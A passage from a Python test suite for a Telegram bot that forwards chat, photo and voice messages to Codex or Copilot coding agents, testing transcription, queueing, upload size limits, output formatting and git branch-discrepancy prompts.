    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    photo = FakePhotoSize(FakeTelegramFile(b"fake-image-bytes", "photos/pic.png"))
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="what is shown here?"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls
    image_paths = runner.resume_calls[-1]["image_paths"]
    assert len(image_paths) == 1
    assert image_paths[0].is_file()
    assert "/.coding-agent-telegram/telegram_attachments/backend/" in image_paths[0].as_posix()
    assert runner.resume_calls[-1]["user_message"].startswith("An image is attached at ../.coding-agent-telegram/telegram_attachments/backend/")
    assert "Open and inspect that image before answering." in runner.resume_calls[-1]["user_message"]
    assert "what is shown here?" in runner.resume_calls[-1]["user_message"]


def test_photo_message_rejected_for_copilot_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "copilot")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    photo = FakePhotoSize(FakeTelegramFile(b"fake-image-bytes", "photos/pic.png"))
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert "Photo attachments are currently supported only for codex sessions." in bot.messages[-1][1]


def test_voice_message_sends_transcript_preview_before_running_agent(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_voice", "voice-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.speech_to_text.enabled = True
    router.speech_to_text.transcribe_file = lambda _path: SimpleNamespace(text="fix the flaky test")

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(
            text=None,
            photo=None,
            caption=None,
            voice=FakeVoiceMessage(FakeTelegramFile(b"voice-bytes", "voice/note.ogg")),
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_voice(update, context))

    assert bot.messages[0][1] == "Recognized voice transcript:\nfix the flaky test\n\nWorking on it..."
    assert runner.resume_calls[-1]["user_message"] == "fix the flaky test"
    working_entries = [entry for entry in bot.sent_messages if "Working on it..." in entry["text"]]
    assert len(working_entries) == 1


def test_voice_message_sends_queued_transcript_notice_when_project_busy(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    runner.has_running_process = lambda _project_path: True
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_voice", "voice-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.speech_to_text.enabled = True
    router.speech_to_text.transcribe_file = lambda _path: SimpleNamespace(text="fix the flaky test")

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(
            text=None,
            photo=None,
            caption=None,
            voice=FakeVoiceMessage(FakeTelegramFile(b"voice-bytes", "voice/note.ogg")),
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_voice(update, context))

    assert "Recognized voice transcript:\nfix the flaky test\n\nQueued as Q1." in bot.messages[0][1]
    assert runner.resume_calls == []


def test_audio_message_is_transcribed_and_forwarded(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_audio", "audio-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.speech_to_text.enabled = True
    router.speech_to_text.transcribe_file = lambda _path: SimpleNamespace(text="summarize this meeting note")

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(
            text=None,
            photo=None,
            caption=None,
            voice=None,
            audio=FakeVoiceMessage(FakeTelegramFile(b"audio-bytes", "audio/clip.mp3"), file_unique_id="clip.mp3"),
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_audio(update, context))

    assert runner.resume_calls[-1]["user_message"] == "summarize this meeting note"


def test_voice_message_logs_stt_error_details(tmp_path: Path, caplog: pytest.LogCaptureFixture):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_voice", "voice-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.speech_to_text.enabled = True

    def fail_transcription(_path):
        raise SpeechToTextError("failed", detail="ffmpeg exited with status 1")

    router.speech_to_text.transcribe_file = fail_transcription

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(
            text=None,
            photo=None,
            caption=None,
            voice=FakeVoiceMessage(FakeTelegramFile(b"voice-bytes", "voice/note.ogg")),
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    with caplog.at_level(logging.WARNING):
        asyncio.run(router.handle_voice(update, context))

    assert bot.messages[-1][1] == "Voice conversion failed."
    assert "ffmpeg exited with status 1" in caplog.text


def test_voice_message_is_queued_when_message_pending_before_runner_busy(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_voice_pending", "voice-pending-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.speech_to_text.enabled = True
    router.speech_to_text.transcribe_file = lambda _path: SimpleNamespace(text="queued via voice")

    async def exercise():
        bot = FakeBot()
        first_update = make_update(text="first text", message_id=101)
        voice_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            message=SimpleNamespace(
                text=None,
                photo=None,
                caption=None,
                message_id=202,
                voice=FakeVoiceMessage(FakeTelegramFile(b"voice-bytes", "voice/note.ogg")),
            ),
        )

        first_task = asyncio.create_task(router.handle_message(first_update, SimpleNamespace(args=[], bot=bot)))
        await asyncio.sleep(0)
        await router.handle_voice(voice_update, SimpleNamespace(args=[], bot=bot))

        assert any("Queued as Q1." in entry["text"] for entry in bot.sent_messages)
        assert not any(
            entry["text"] == "Recognized voice transcript:\nqueued via voice\n\nWorking on it..."
            for entry in bot.sent_messages
        )

        runner.release_next()
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()
        await first_task

        assert runner.resume_calls[0]["user_message"] == "first text"
        assert runner.resume_calls[1]["user_message"] == "queued via voice"

    asyncio.run(exercise())


def test_audio_message_rejected_when_declared_size_exceeds_stt_limit(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_audio_limit", "audio-limit-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.speech_to_text.enabled = True

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(
            text=None,
            photo=None,
            caption=None,
            voice=None,
            audio=FakeVoiceMessage(
                FakeTelegramFile(b"small-audio", "audio/clip.mp3"),
                file_unique_id="clip.mp3",
                file_size=(20 * 1024 * 1024) + 1,
                file_name="clip.mp3",
            ),
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_audio(update, context))

    assert runner.resume_calls == []
    assert bot.messages[-1][1] == "Audio is too large for local speech-to-text. The maximum supported size is 20 MB."


def test_text_message_is_processed_after_voice_triggered_run_finishes(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_voice", "voice-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    router.speech_to_text.enabled = True
    router.speech_to_text.transcribe_file = lambda _path: SimpleNamespace(text="first via voice")

    async def exercise():
        bot = FakeBot()
        voice_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            message=SimpleNamespace(
                text=None,
                photo=None,
                caption=None,
                voice=FakeVoiceMessage(FakeTelegramFile(b"voice-bytes", "voice/note.ogg")),
            ),
        )
        text_update = make_update(text="second via text")

        voice_task = asyncio.create_task(router.handle_voice(voice_update, SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(text_update, SimpleNamespace(args=[], bot=bot))
        assert any("Question queued as Q1." in message for _, message, _, _ in bot.messages)

        runner.release_next()
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()
        await voice_task

        assert len(runner.resume_calls) == 2
        assert runner.resume_calls[0]["user_message"] == "first via voice"
        assert runner.resume_calls[1]["user_message"] == "second via text"

    asyncio.run(exercise())


def test_busy_queue_and_final_output_reply_to_original_message(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_reply", "reply-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_update = make_update(text="first question", message_id=101)
        second_update = make_update(text="second question", message_id=202)

        first_task = asyncio.create_task(router.handle_message(first_update, SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(second_update, SimpleNamespace(args=[], bot=bot))
        queued_entries = [entry for entry in bot.sent_messages if "Question queued as Q1." in entry["text"]]
        assert queued_entries
        assert queued_entries[-1]["reply_to_message_id"] == 202

        runner.release_next()
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()
        await first_task

        working_entries = [entry for entry in bot.sent_messages if "Working on it..." in entry["text"]]
        assert working_entries
        assert working_entries[0]["reply_to_message_id"] == 101
        assert working_entries[-1]["reply_to_message_id"] == 202

        final_entries = [
            entry
            for entry in bot.sent_messages
            if "Codex output" in entry["text"] or "Task completed." in entry["text"]
        ]
        assert final_entries
        reply_targets = {entry["reply_to_message_id"] for entry in final_entries}
        assert 101 in reply_targets
        assert 202 in reply_targets

    asyncio.run(exercise())


def test_final_output_replies_only_on_first_message(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = CommandBlockRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_final_reply", "final-reply-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    bot = FakeBot()
    update = make_update(text="show me the result", message_id=777)
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    final_entries = [
        entry
        for entry in bot.sent_messages
        if "Codex output" in entry["text"] or "Command" in entry["text"] or "Task completed." in entry["text"]
    ]
    assert len(final_entries) >= 3
    assert final_entries[0]["reply_to_message_id"] == 777
    assert all(entry["reply_to_message_id"] is None for entry in final_entries[1:])


def test_photo_message_rejected_when_declared_size_exceeds_limit(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    photo = FakePhotoSize(
        FakeTelegramFile(b"small-content", "photos/pic.png"),
        file_size=(5 * 1024 * 1024) + 1,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert bot.messages[-1][1] == "Photo is too large. The maximum supported size is 5 MB."


def test_photo_message_rejected_when_downloaded_size_exceeds_limit(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    oversized = b"x" * ((5 * 1024 * 1024) + 1)
    photo = FakePhotoSize(FakeTelegramFile(oversized, "photos/pic.png"), file_size=1024)
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert bot.messages[-1][1] == "Photo is too large. The maximum supported size is 5 MB."


def test_photo_message_reports_missing_project_folder_before_storing_attachment(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    backend.rmdir()

    photo = FakePhotoSize(FakeTelegramFile(b"fake-image-bytes", "photos/pic.png"))
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert "Project folder no longer exists for this session: backend" in bot.messages[-1][1]


def test_assistant_output_is_rendered_as_html_not_raw_markdown(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = MarkdownRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    codex_message = bot.messages[1]
    assert codex_message[2] == "HTML"
    assert "[agent_runner.py](" not in codex_message[1]
    assert "<code>agent_runner.py</code>" in codex_message[1]
    assert "<code>config.py</code>" in codex_message[1]


def test_copilot_output_uses_copilot_label(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = MarkdownRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "copilot")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert any("Copilot output" in message[1] for message in bot.messages)


def test_message_reports_missing_project_folder_before_running_agent(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)
    backend.rmdir()

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert runner.resume_calls == []
    assert bot.messages[-1][1] == "Project folder does not exist: backend\nRun /project backend again."


def test_message_prompts_for_provider_when_not_selected(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert runner.resume_calls == []
    assert "Provider selection is required" in bot.messages[-1][1]
    assert bot.messages[-1][3] is not None
    assert store.get_chat_state("bot-a", 123)["pending_action"]["kind"] == "message"


def test_pending_action_blocks_queue_drain_until_prerequisites_are_resolved(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    async def exercise():
        bot = FakeBot()
        first_update = make_update(text="first question", message_id=101)
        second_update = make_update(text="second question", message_id=202)
        context = SimpleNamespace(args=[], bot=bot)

        await router.handle_message(first_update, context)
        await router.handle_message(second_update, context)

        state = store.get_chat_state("bot-a", 123)
        assert state["pending_action"]["kind"] == "message"
        assert state["pending_action"]["user_message"] == "first question"
        assert any("Question queued as Q1." in entry["text"] for entry in bot.sent_messages)
        assert runner.resume_calls == []

    asyncio.run(exercise())


def test_provider_callback_drains_queued_messages_after_pending_message_runs(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    async def exercise():
        bot = FakeBot()
        context = SimpleNamespace(args=[], bot=bot)

        await router.handle_message(make_update(text="first question", message_id=101), context)
        await router.handle_message(make_update(text="second question", message_id=202), context)

        query = SimpleNamespace(
            data="provider:set:codex",
            answer=None,
            edit_message_text=None,
        )
        callback_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=query,
            message=SimpleNamespace(text=None, photo=None, caption=None, message_id=None),
        )
        edited = []

        async def fake_answer():
            return None

        async def fake_edit(text, reply_markup=None):
            edited.append((text, reply_markup))

        query.answer = fake_answer
        query.edit_message_text = fake_edit

        await router.handle_provider_callback(callback_update, context)

        assert edited[-1][0] == "Current provider set to: codex"
        assert len(runner.create_calls) == 1
        assert len(runner.resume_calls) == 2
        assert runner.resume_calls[0]["user_message"] == "first question"
        assert runner.resume_calls[1]["user_message"] == "second question"

        state = store.get_chat_state("bot-a", 123)
        assert state.get("pending_action") is None
        assert not router._has_pending_queue_files(123)

    asyncio.run(exercise())


def test_message_prompts_for_branch_discrepancy_before_running_bot_managed_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="test_branch")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main", "test_branch"])

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert runner.resume_calls == []
    assert "Branch discrepancy detected before running the active session." in bot.messages[-1][1]
    assert "Stored branch: test_branch" in bot.messages[-1][1]
    assert "Current branch in repo: main" in bot.messages[-1][1]
    assert bot.messages[-1][3] is not None


def test_message_prefers_branch_discrepancy_prompt_over_creating_new_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="test_branch")
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.set_current_branch("bot-a", 123, "main")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main", "test_branch"])

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert runner.create_calls == []
    assert runner.resume_calls == []
    assert "Branch discrepancy detected before running the active session." in bot.messages[-1][1]


def test_branch_discrepancy_current_choice_updates_branch_and_resumes(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="test_branch")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "continue",
        "branch_resolution": {
            "kind": "discrepancy",
            "session_id": "sess_md",
            "stored_branch": "test_branch",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main", "test_branch"])

    edited = []
    query = SimpleNamespace(
        data="branchdiscrepancy:current",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))

    assert edited[-1][0] == "Using current branch: main"
    assert runner.resume_calls
    state = store.get_chat_state("bot-a", 123)
    assert state["current_branch"] == "main"
    assert state["sessions"]["sess_md"]["branch_name"] == "main"


def test_branch_discrepancy_offers_fallback_when_stored_branch_is_missing(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="enhancements")
    store.set_pending_action(
        "bot-a",
        123,
        {
            "kind": "message",
            "user_message": "continue",
            "branch_resolution": {
                "kind": "discrepancy",
                "session_id": "sess_md",
                "stored_branch": "enhancements",
                "current_branch": "main",
            },
        },
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", default_branch="main", local_branches=["main"])

    edited = []
    query = SimpleNamespace(
        data="branchdiscrepancy:stored",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))

    assert "Stored branch is no longer available." in edited[-1][0]
    assert "Missing local/enhancements and origin/enhancements." in edited[-1][0]
    reply_markup = edited[-1][1]
    labels = [button.text for row in reply_markup.inline_keyboard for button in row]
    assert "local/main" in labels
    assert "origin/main" in labels
    assert len(labels) == 2


def test_branch_discrepancy_fallback_offers_default_and_current_branch_sources(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="enhancements")
    store.set_pending_action(
        "bot-a",
        123,
        {
            "kind": "message",
            "user_message": "continue",
            "branch_resolution": {
                "kind": "discrepancy",
                "session_id": "sess_md",
                "stored_branch": "enhancements",
                "current_branch": "feature-x",
            },
        },
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="feature-x", default_branch="main", local_branches=["main", "feature-x"])

    edited = []
    query = SimpleNamespace(
        data="branchdiscrepancy:stored",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))

    reply_markup = edited[-1][1]
    labels = [button.text for row in reply_markup.inline_keyboard for button in row]
    assert "local/main" in labels
    assert "origin/main" in labels
    assert "local/feature-x" in labels
    assert "origin/feature-x" in labels


def test_branch_discrepancy_fallback_branch_source_resumes_pending_run(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="enhancements")
    store.set_pending_action(
        "bot-a",
        123,
        {
            "kind": "message",
            "user_message": "continue",
            "branch_resolution": {
                "kind": "switch_source",
                "source_branch": "main",
                "new_branch": "enhancements",
            },
        },
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=True,
            message="Created branch 'enhancements' from origin/main.",
            current_branch="enhancements",
            default_branch="main",
        ),
    )

    token = router._register_branch_source_token("origin", "main", "enhancements")
    edited = []
    query = SimpleNamespace(
        data=f"branchsource:{token}",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(update, context))

    assert "Created branch 'enhancements' from origin/main." in edited[-1][0]
    assert runner.resume_calls
    state = store.get_chat_state("bot-a", 123)
    assert state["current_branch"] == "enhancements"
    assert state["sessions"]["sess_md"]["branch_name"] == "enhancements"


@pytest.mark.parametrize(
    ("source_kind", "source_branch"),
    [
        ("local", "main"),
        ("origin", "main"),
        ("local", "feature-x"),
        ("origin", "feature-x"),
    ],
)
def test_branch_discrepancy_fallback_source_options_resume_pending_run(
    tmp_path: Path,
    source_kind: str,
    source_branch: str,
):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="enhancements")
    store.set_pending_action(
        "bot-a",
        123,
        {
            "kind": "message",
            "user_message": "continue",
            "branch_resolution": {
                "kind": "switch_source",
                "new_branch": "enhancements",
            },
        },
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-x",
        default_branch="main",
        local_branches=["main", "feature-x"],
        prepare_from_source_result=SimpleNamespace(
            success=True,
